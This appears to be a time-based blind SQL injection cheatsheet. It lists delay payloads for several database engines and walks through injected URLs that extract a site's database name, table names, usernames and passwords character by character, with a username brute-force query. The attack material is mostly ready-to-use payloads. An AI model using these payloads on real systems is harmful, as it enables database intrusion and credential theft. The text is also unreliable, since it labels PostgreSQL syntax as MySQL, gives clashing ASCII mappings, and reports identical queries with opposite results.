# MySQL Time based SQL Injection Cheatsheet
  
  This is almost the same technique followed as [Blind Based SQLi](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi)
  
  ## Detecting the vulnerability
  The following stacked query detects if the website if vulnerable to Time Based SQL injection, by checking the website time response. The following condition is True because 1=1, which later executes the sleep function, so a 10 seconds delay is what we are expenting on the website's response.
  
  ```sql
  SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
  'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
  1'=sleep(25)='1
  '%2b(select*from(select(sleep(2)))a)%2b'
  WAITFOR DELAY '0:0:25';--
  OR SLEEP(25)
  AND SLEEP(25) AND ('kleiton'='kleiton
  WAITFOR DELAY '0:0:25' and 'a'='a;--
  IF 1=1 THEN dbms_lock.sleep(25);
  SLEEP(25)
  pg_sleep(25)
  and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--
  DBMS_LOCK.SLEEP(25);
  AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--
  1,'0');waitfor delay '0:0:25;--
  (SELECT 1 FROM (SELECT SLEEP(25))A)
  %2b(select*from(select(sleep(25)))a)%2b'
  /**/xor/**/sleep(25)
  or (sleep(25)+1) limit 1 --
  ```
  
  Example:
  ```http://domain.com/index.php?id=15'XOR(if(now()=sysdate(),sleep(5*5),0))OR'```  
  If the websites response is ~15 seconds, it means it is vulnerable to this kind of attack.
  
  ## Retrieving the length of database name  
  
  **Retrieving the length of database name**  
  
  The given query will verify if database has less then 15 characters:  
  ```SELECT CASE WHEN (length(database()) < 15) THEN pg_sleep(10) ELSE pg_sleep(0) END--```  
  If the condition is satisfied, the response is delayed by 10 seconds, otherwise keep guessing the number.
  
  Let's assume that the database name is **users**, the length would be 5, so let's use the following query to prove this:  
  ```SELECT CASE WHEN (length(database()) = 5) THEN pg_sleep(10) ELSE pg_sleep(0) END--```  
  The response is ~10 seconds so, the database name is 5 characters long.
  
  ## Retrieving the database name
  ![ascii_table](https://www.asciitable.com/asciifull.gif)
  
  In this case we are going to use **pg_sleep()** function, however you can try the other functions mentioned  at **Detecting the vulnerability** section.
  
  The given query will define is the first character of database name is 111 (o):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select database()),1,1)) > 110) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```
  The response was very short, which means that the first character of the databaze is not **o**, let's keep guessing.
  
  The given query will define is the first character of database name is 110 (n):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select database()),1,1)) > 109) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response was ~10 seconds delayed so the first character of the database is **n**, let's move on.
  
  Continue enumerate the second character of database name.
  
  The given query will define is the second character of database name is 98 (h):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select database()),2,1)) > 97) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response was very short, which means that the first character of the databaze is not **h**, let's keep guessing.
  
  The given query will define is the first character of database name is 116 (t):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select database()),2,1)) > 115) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response is delayed by 10 seconds, meaning that **t** is the second character of the database.
  
  Continue doing the same process over and over until you find all 11 characters.
  
  1st character: 110 -> **n**  
  2nd character: 116 -> **t**  
  3rd character: 116 -> **t**  
  4th character: 104 -> **h**  
  5th character: 119 -> **w**  
  6th character: 102 -> **f**  
  7th character: 105 -> **i**  
  8th character: 57 -> **9**  
  9th character: 95 -> **_**  
  10th character: 100 -> **d**  
  11th character: 98 -> **b**  
  
  All 11 charachters combined together will be the database name: **ntthwfi9_db**
  
  **Retrieving length of table name**
  
  Given query will test the condition whether the length of string for the first table is equal than 4 or not.  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 4) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response was fast, meaning that the length of the first table name of the database is not 4.  
  
  Let's try the same query with 6:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response was a little more than 10 seconds, which mean that the length is 6 characters.  
  
  NOTE: You can enumerate the other tables too, by changing the number value in this part of payload: (limit **0**,1). Simply replace it with another number. For example, let's see if 4th table columns has 6 characters:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 6) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  
  **Retrieving name of table name**
  
  On this case, I will enumerate the the first column. Let's find the first character of table:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1)) > 108) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response is quick, the first character of the first table name not found.
  
  Let's try again:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1)) > 108) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response is more then 10 seconds, the first character is **u** (ascii: 117)
  
  Let's find the last character of table (5th character):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1) ,1,1)) > 114) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response is more then 10 seconds, the 5th character is *s** (ascii code: 115)
  
  Keep doing the same process for the other characters, until you find all the characters.
  
  1st character: 110 -> **u**  
  2nd character: 115 -> **s**  
  3rd character: 101 -> **e**  
  4th character: 114 -> **r**  
  5th character: 115 -> **s**  
  
  All 5 charachters combined together will be the first table name: **users**
  
  **Retrieve length of column name**
  
  Using the same method as before, enumerate the length of column name.
  
  Given below query will test for string length is equal to 6 or not:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select username from users limit 0,1)) = 6) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response is quick, the length of the first column of **users** table, is not 6.
  
  Given below query will test for string length is equal to 4 or not:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select username from users limit 0,1)) = 4) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response was longer than 10 seconds, the first column is 4 characters long.
  
  Using the same method, you can also enumerate other columns.
  
  Enumerate the length of second column if it is 6 or not:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select username from users limit 1,1)) = 6) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```  
  The response is quick, let's keep trying.
  
  Enumerate the length of second column if it is 5 or not:  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (length((select username from users limit 1,1)) = 5) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```
  
  And so on...
  
  ***Alternative way of finding columns name by bruteforcing them***
  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--+```  
  If the username **administrator** exists, you should except a response delay of 10 seconds, otherwise keep trying other methods.
  
  **Retrieve column name**
  
  Since we know the length of column name is 4, let's find out the characters one by one.
  
  Given below query will test if the first character of the first column name is ascii 101 (e):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select username from users limit 0,1) ,1,1)) > 100) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```
  The response is quick, the guess was not correct.
  
  Given below query will test if the first character of the first column name is ascii 112 (p):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select username from users limit 0,1) ,1,1)) > 100) THEN pg_sleep(10) ELSE pg_sleep(0) END--+```
  
  Given below query will test if the third character of the third column name is ascii 115 (s):  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (ascii(substr((select username from users limit 2,1) ,1,1)) > 114) THEN pg_sleep(10) ELSE pg_sleep(0) END--```
  
  And so on..
  
  1st character: 110 -> **p**  
  2nd character: 97 -> **a**  
  3rd character: 115 -> **s**  
  4th character: 115 -> **s**  
  
  All 4 charachters combined together will be the column table name: pass
